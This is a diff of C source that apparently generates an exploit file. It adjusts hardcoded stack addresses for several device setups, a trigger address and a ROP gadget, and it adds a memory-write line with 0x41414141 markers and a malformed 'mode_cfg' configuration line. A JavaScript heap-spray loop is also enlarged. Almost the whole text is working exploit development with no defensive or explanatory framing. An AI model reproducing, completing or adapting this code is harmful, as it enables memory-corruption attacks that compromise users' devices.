@@ -202,11 +202,11 @@ int main(int   argc,
 	fprintf(fp, "#   - with love from spv <3\n");
 	fprintf(fp, "\n");
 
-//	uint32_t	stack_base					= 0x1c7738; // my shell setup
+	uint32_t	stack_base					= 0x1c7738; // my shell setup
 //	uint32_t	stack_base					= 0x1c7c88; // my 4s shell setup
 //	uint32_t	stack_base					= 0x1c2e48; // my lldb
 //	uint32_t	stack_base					= 0x1c7d68; // btserver env
-	uint32_t	stack_base					= 0x1c7dd8; // wifiFirmwareLoader env
+//	uint32_t	stack_base					= 0x1c7dd8; // wifiFirmwareLoader env
 	uint32_t	magic_trigger_addr			= 0xb6074;
 
 	uint32_t	mov_r0_0_bx_lr				= 0x8d3e	| 1;
@@ -286,6 +286,9 @@ int main(int   argc,
 						   0x42424242));
 #endif
 
+	fprintf(fp, "%s\n", write32_unslid(stack_base - 0x948, 0x41414141));
+	fprintf(fp, "mode_cfg{dns41.1.1.1;}");
+
 #if 0
 //	fprintf(fp,
 //			"%s\n",
@@ -334,7 +337,7 @@ int main(int   argc,
 							"var parent = new Uint8Array(0x100);"
 							"var child = new Uint8Array(0x100);"
 							"    var fuck = new Array();"
-							"    for (var i = 0; i < 0x10000; i++) {"
+							"    for (var i = 0; i < 0x200000; i++) {"
 							"        fuck[i] = i;"
 							"    }"
 							"    delete fuck;"
@@ -343,7 +346,7 @@ int main(int   argc,
 							strlen("var parent = new Uint8Array(0x100);"
 								   "var child = new Uint8Array(0x100);"
 								   "    var fuck = new Array();"
-								   "    for (var i = 0; i < 0x10000; i++) {"
+								   "    for (var i = 0; i < 0x200000; i++) {"
 								   "        fuck[i] = i;"
 								   "    }"
 								   "    delete fuck;"
